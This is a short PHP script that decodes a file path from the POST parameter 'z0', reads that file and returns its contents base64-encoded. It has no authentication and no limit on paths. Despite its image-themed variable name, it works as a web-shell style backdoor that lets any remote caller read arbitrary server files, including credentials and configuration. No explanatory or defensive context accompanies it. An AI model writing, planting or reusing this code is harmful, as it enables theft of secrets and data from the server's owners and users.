<?php

$szFilePath = base64_decode($_POST['z0']);

$abImageData = file_get_contents($szFilePath) or die('ERROR://Unable to open file.');
echo(base64_encode($abImageData));

?>